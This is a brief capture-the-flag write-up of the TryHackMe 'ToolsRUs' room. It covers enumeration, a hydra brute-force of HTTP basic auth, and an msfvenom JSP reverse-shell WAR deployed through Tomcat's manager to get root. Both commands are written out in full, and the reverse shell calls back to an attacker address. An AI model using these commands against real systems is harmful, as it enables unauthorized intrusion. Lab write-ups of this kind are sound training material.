#hydra #basic-auth #msfvenom #tomcat 

https://tryhackme.com/r/room/toolsrus

---
#### Nmap
![[Screenshot_2024-05-14_18-39-09.png]]
I enumerated with gobuster and I found `/guidelines` with this line in:
![[Screenshot_2024-05-14_18-42-14.png]]

I can answer most of the questions with these informations

But for Bob's password at `/protected`, I'll use hydra:
```shell
hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.123.232 http-get /protected
```

It was a #basic-auth  so I had to use the `http-get` tag with the path `/protected` leading to the `basic auth`
![[Screenshot_2024-05-14_19-14-48.png]]

I used these creds to login on tomcat's admin panel on port `1234`

Like the [[Thompson]] room, I had to use `msfvenom` to build a `.war` payload:
```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.14.79.56 LPORT=8010 -f war -o revshell.war
```
Be careful to te listening port 9000 != 8000 !

With the reverse shell uploaded, I spawned directly as root so no privilege escalation was needed.